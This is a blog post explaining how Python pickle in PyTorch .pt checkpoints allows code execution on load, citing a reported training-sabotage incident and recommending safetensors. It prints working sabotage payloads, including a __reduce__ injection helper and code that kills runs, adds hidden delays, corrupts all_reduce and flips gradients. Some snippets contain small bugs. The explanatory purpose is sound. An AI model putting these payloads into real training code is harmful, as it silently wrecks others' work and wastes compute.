---
title: The Pickle Problem - A Security Nightmare in ML
excerpt: Learn how malicious code can be embedded in model weights and how it can sabotage training processes.
tags: [Machine Learning, Security, Model Serialization, Pickle, PyTorch, safetensors]
date: 2025-01-13 05:28:10 +0530
categories: machine-learning data-science
toc: true
permalink: /:categories/:title
---

# Background

Recent events in the machine learning community have highlighted a critical yet often overlooked aspect of ML systems: model serialization security. A particularly concerning incident at TikTok demonstrated just how vulnerable our current practices are. An ex-intern managed to sabotage their LLM training process by embedding malicious code directly within the model weights, leading to months of debugging efforts and millions of dollars in wasted resources.

What makes this case particularly notable wasn't just the scale of disruption, but the method of attack. The malicious code wasn't hidden in the repository where it might have been caught by code reviews - **it was concealed within the model itself**. The sabotage manifested in various ways: introducing random delays, killing training runs unexpectedly, and even reversing training progress. These issues persisted undetected for months, partly due to fundamental weaknesses in how we handle model serialization.

This incident raises important questions about how we store and distribute our models, and why the popular PyTorch .pt format might not be as secure as we need it to be. In this article, we'll explore how such malicious code remained undetected for so long due to broken model serialization practices, and why the safetensors format was developed as a solution. This discussion is particularly relevant given the growing industry consensus around adopting safetensors, including our own recent implementation of additional features to support this format.

# What's broken with the current model serialization?

In the PyTorch ecosystem, saving and loading models has become deceptively simple. The `.pt` format has emerged as the de facto standard for storing model state dictionaries - essentially mappings between layer names and their corresponding weights:

```python
torch.save(model.state_dict(), "model.pt")

state_dict = torch.load("model.pt")
model.load_state_dict(state_dict)
```

This approach seems straightforward and has served the community well for years. However, there's a significant security vulnerability lurking beneath this simple interface.
##  The Pickle Issue: A Security Nightmare

Under the hood, the `.pt` format uses python's pickle strategy to serialize and deserialize the state dictionary. While pickle is versatile enough to serialize nearly any Python object, this flexibility comes at a severe security cost: pickle can __execute arbitary code during deserialization__. One way to hack the models weights is to modify its `__reduce__` method to execute arbitrary code.

```python
class PythonObj:
	def __reduce__(self):
		return (exec, ("print('hello')") )
```

If you serialize this class object and load the object back, you will see the reduce method being executed. Specifically, you will see a `hello`  statement being printed whenever you load the pickled file.

In case of a man-in-the-middle attack where  model classes are already defined and their objects are pickled, we can bind the malicious `reduce` function code to the pickled object. Here's how an attacker might bind the malicious code to a given object to execute harmful code:
```python

def inject_malicious_code(obj, code_str):
    # Define a custom reduce function
    def reduce(self):
        return (exec, (code_str,))

    # Bind the custom reduce function to the object's __reduce__ method
    bound_reduce = reduce.__get__(obj, obj.__class__)
    setattr(obj, "__reduce__", bound_reduce)
    return obj

MALICIOUS_CODE_STR = """
print('hello')
"""

state_dict = inject_malicious_code(state_dict, MALICIOUS_CODE_STR)
```

Let's extend this to a critical scenario by replacing the print statement.

```python
MALICIOUS_CODE_STR = """
import os

pid = os.getpid() # get program-id of the current program
os.kill(pid, 9) # kill the current program
"""
```
<figure>
    <a href="{{ site.url }}/{{ site.baseurl }}/assets/images/safetensors/pikachu.png"><img src="{{ site.url }}/{{ site.baseurl }}/assets/images/safetensors/pikachu.png"></a>
    <figcaption><b>Figure 1:</b> <i> Developers when they realize that the training is corrupted</i></figcaption>
</figure>

In the context of ML models, this vulnerability becomes even more concerning. An attacker could modify model weights to include malicious code that executes during model loading. Since model loading is such a common operation - happening during training, evaluation, and deployment - this creates numerous opportunities for exploitation.

## Anatomy of a Model-Based Attack

The TikTok incident provides a masterclass in how serialization vulnerabilities can be exploited to sabotage training processes. Let's break down different types of attacks that can be embedded in model weights, starting with simple examples and building up to more sophisticated ones.

<figure>
    <a href="{{ site.url }}/{{ site.baseurl }}/assets/images/safetensors/trojan.png"><img src="{{ site.url }}/{{ site.baseurl }}/assets/images/safetensors/trojan.png"></a>
    <figcaption><b>Figure 2:</b> <i> Trojan Tensors: Malicious code embedded in model weights</i></figcaption>
</figure>

### Example 1: Basic Training Disruption

Here's a simple example of how malicious code could be embedded to randomly terminate training:

```python
MALICIOUS_CODE_STR = """
import random
import sys

# Randomly terminate training with 25% probability
if random.random() < 0.25:
    sys.exit("Training terminated due to 'Out Of Memory hardware error'")
"""
```

This basic attack might seem obvious in isolation, but when embedded within model weights and triggered during large-scale training, it can be extraordinarily difficult to debug. Engineers might spend weeks investigating hardware issues or cluster instability.

### Example 2: Silent Performance Degradation

A more subtle attack might introduce random delays that make training inefficient without obviously failing:

```python
MALICIOUS_CODE_STR = """
import time
import random
from datetime import datetime

def is_work_hours():
	current_hour = datetime.now().hour
	return 9 <= current_hour <= 17

def continuous_delay():
	while True:
	    time.sleep(random.uniform(0.1, 0.5))

	if is_work_hours(): # delay more during work hours
		time.sleep(3)


delay_thread = threading.Thread(target=continuous_delay, daemon=True) delay_thread.start()
"""
```

This attack is particularly insidious because it:

1. Introduces variable delays that are hard to profile
2. Only activates during certain hours, making it harder to reproduce
3. Doesn't cause obvious failures that would trigger alerts

### Example 3: Distributed Training Sabotage

In distributed training environments, we can create even more sophisticated attacks that target node communication:
```python
MALICIOUS_CODE_STR = """
import torch.distributed as dist

# Store original all_reduce function
dist._original_all_reduce = dist.all_reduce

def corrupted_all_reduce(tensor, *args, **kwargs):
	tensor = tensor.add_(1)
	return dist._origin_all_reduce(tensor, *args, **kwargs)

setattr(dist, "all_reduce", corrupted_all_reduce)
"""
```


This distributed training attack is particularly devastating because it:

1. Corrupts gradient synchronization in subtle ways
2. Introduces random communication delays

One can extend these distributed training attacks to mimic normal distributed training challenges like:

1. Occasionally dropping nodes from the training process

```python
import torch.distributed as dist
# Periodically drop nodes from training 
def node_dropper():
	while True: 
		time.sleep(random.uniform(300, 1800)) # Wait 5-30 minutes
		if dist.get_rank()!=0 and random.random() < 0.2: # 20% chance to drop 
			dist.destroy_process_group() 

dropper_thread = threading.Thread(target=node_dropper, daemon=True)
dropper_thread.start()

```
Here, `dist.destroy_process_group()` would terminate the underlying communication channels between the worker node and overall cluster. If you call `dist.destroy_process_group()` on ** say, worker node 1**, that node will clean up its own resources and terminate its participation in the distributed process group:
- From the cluster's perspective, **node 1 is now unavailable**. It can no longer participate in distributed communication.
- However, if the remaining nodes attempt distributed operations (e.g., `dist.broadcast`, `dist.all_reduce`) that involve node 1, they may __hang, fail, or encounter errors__, depending on the backend and how the distributed operation is implemented.

## Example 4: The Ultimate Stealth Attack - Gradient Manipulation


The most sophisticated attack might directly manipulate the training process while hiding its tracks:

```python

import torch
import torch.nn as nn
from torch.autograd import Function
import random
import time

class GradientCorruptor(Function):
    @staticmethod
    def forward(ctx, input):
        ctx.save_for_backward(input)
        return input.clone()

    @staticmethod
    def backward(ctx, grad_output):
        input, = ctx.saved_tensors
        
        # Subtly modify gradients
        modified_grad = grad_output.clone()
        
        # Random sign flips with low probability
        mask = torch.rand_like(modified_grad) < 0.01
        modified_grad[mask] *= -1
        
        # Occasionally zero out gradients
        mask = torch.rand_like(modified_grad) < 0.005
        modified_grad[mask] = 0
        
        # Scale gradients randomly to create instability
        if random.random() < 0.1:
            scale = random.uniform(0.1, 10.0)
            modified_grad *= scale
        
        return modified_grad

class LayerCorruptor(nn.Module):
    def __init__(self, layer):
        super().__init__()
        self.layer = layer
        self.training_steps = 0
		self.old_state = None

    def forward(self, x):
        self.training_steps += 1
        
        # Apply the gradient corruptor
        if self.training:
            x = GradientCorruptor.apply(x)
            
            # Periodically reverse optimization progress
            if self.training_steps % 100 == 0 and random.random() < 0.2:
                # Save the current state and
                # Load a slightly older state to reverse progress
                # This simulates the model "forgetting" what it learned
                self.old_state = {k: v.clone() 
	                for k, v in self.layer.state_dict().items()} 
            elif self.old_state is not None and random.random() < 0.1:
                self.layer.load_state_dict(self.old_state)
        
        return self.layer(x)

def inject_gradient_corruptor():
    def sabotage_module(module):
        for name, child in module.named_children():
            if isinstance(child, (nn.Linear, nn.Conv2d, nn.LayerNorm)):
                # Replace layer with sabotaged version
                setattr(module, name, LayerCorruptor(child))
            else:
                sabotage_module(child)
    
    # Hook into model loading
    original_load_state_dict = torch.nn.Module.load_state_dict
    
    def sabotaged_load_state_dict(self, *args, **kwargs):
        result = original_load_state_dict(self, *args, **kwargs)
        # After loading weights, inject our corruptor
        sabotage_module(self)
        return result
    
    # Replace the loading function
    torch.nn.Module.load_state_dict = sabotaged_load_state_dict

inject_gradient_corruptor()
```

This final example represents the pinnacle of training sabotage because it:

1. Directly interferes with the learning process
2. Creates issues that look like standard training problems (vanishing gradients, unstable training)
3. Is extremely difficult to detect without detailed gradient analysis
4. Produces failures that appear to be legitimate optimization challenges

## Why Traditional Security Measures Fail?

What made these attacks particularly elusive at TikTok was their implementation within the model weights themselves. Traditional security measures like:

- Code reviews
- Static analysis
- Runtime monitoring
- Performance profiling

Would all miss these issues because the malicious code is:

1. Not visible in the source code
2. Only executed during model loading
3. Designed to mimic common training issues
4. Implemented with random triggers to avoid detection

<figure>
    <a href="{{ site.url }}/{{ site.baseurl }}/assets/images/safetensors/gru.png"><img src="{{ site.url }}/{{ site.baseurl }}/assets/images/safetensors/gru.png"></a>
    <figcaption><b>Figure 3:</b> <i> Training issues that are hard to debug</i></figcaption>
</figure>


# Enter Safetensors: A Secure Alternative

The `safetensors` format was created specifically to address these security concerns while also providing additional benefits for large-scale machine learning operations. Here's what makes it special:

### 1. Zero-Copy Architecture
Traditional model loading typically works like this: when you load a model, the entire file is read into memory, deserialized, and then converted into tensors. This approach becomes problematic with large models that might be several gigabytes in size. Imagine loading a 20GB model when you only need to access 1GB of its weights – you're wasting 19GB of memory!

Safetensors addresses this with its zero-copy architecture. Here's how it works:

```python
from safetensors import safe_open
from safetensors.torch import save_file

# First, save your model in the safetensors format
save_file({"weight": model_weight}, "model.safetensors")

# Later, when loading, you can access specific tensors without loading the entire file
with safe_open("model.safetensors", framework="torch") as f:
    # This only loads the exact tensor you need
    attention_layer = f.get_tensor("transformer.attention.weight")
```

The beauty of this approach is that it maintains a memory mapping of the file structure without actually loading the data. When you request a specific tensor, only that piece of data is read from disk. This is particularly valuable in scenarios like:

- Analyzing or debugging particular components
- Fine-tuning specific layers of a large model
- Deploying models in memory-constrained environments

### 2. Improved Serialization

Unlike pickle, which needs to store additional Python object information, Safetensors uses a straightforward header-data format. The header contains metadata about tensor shapes, data types, and locations, while the data section contains the raw tensor values.

Here's what this looks like in practice:
```python
# The header portion of a safetensors file might look like this:
{
    "layer1.weight": {
        "dtype": "float32",
        "shape": [768, 768],
        "data_offsets": [0, 2359296]
    },
    "layer1.bias": {
        "dtype": "float32",
        "shape": [768],
        "data_offsets": [2359296, 2362368]
    }
}

# This metadata enables economic and selectful loading
with safe_open("model.safetensors", framework="torch") as f:
    # Get metadata without loading any tensor data
    metadata = f.metadata()
    
    # Selectively load only the layers you need
    attention_weights = {
        name: f.get_tensor(name)
        for name in metadata
        if "attention" in name
    }
```

This structure provides several advantages:

1. The header is small and quick to read, allowing rapid inspection of model structure
2. Tensor data is stored in a contiguous, aligned format for efficient reading
3. The format supports parallel loading of multiple tensors
4. Memory mapping allows the operating system to optimize file access

### 3. Security Through Simplicity

The security benefits of Safetensors come from its intentionally limited scope. By storing only tensor data and essential metadata, it eliminates the possibility of arbitrary code execution during loading. This is a stark contrast to pickle-based formats where, as we saw earlier, malicious code can be embedded in various ways.

The security comes from what Safetensors doesn't do, rather than what it does. There's no serialization of Python objects, no storing of methods or functions, and no execution of any code during loading. The format is essentially a structured binary file with a clear separation between metadata and data.

### 4. Performance as a Feature

The combination of zero-copy architecture, efficient storage, and simplified loading process leads to significant performance improvements.

# Conclusion

The TikTok incident serves as a wake-up call for the machine learning community about the importance of secure model serialization. While pickle-based formats like `.pt` files have served us well, they carry significant security risks that can be exploited in sophisticated ways. The `safetensors` format represents a modern, secure, and efficient alternative that addresses these concerns while providing additional benefits for large-scale machine learning operations.

As the field continues to grow and models become larger and more complex, adopting secure practices like using `safetensors` becomes increasingly important. The extra effort required to implement support for this format is a small price to pay for the security and performance benefits it provides.

# References

1. [Hacker News Post on TikTok Incident](https://news.ycombinator.com/item?id=41900402)
2. [Relevant blog post 1](https://franklee.xyz/blogs/2024-10-19-safetensor)
3. [Relevant blog post 2](https://dev.to/stacklok/understanding-safetensors-a-secure-alternative-to-pickle-for-ml-models-o71)
4. [Relevant blog post 3](https://medium.com/@mandalsouvik/safetensors-a-simple-and-safe-way-to-store-and-distribute-tensors-d9ba1931ba04)
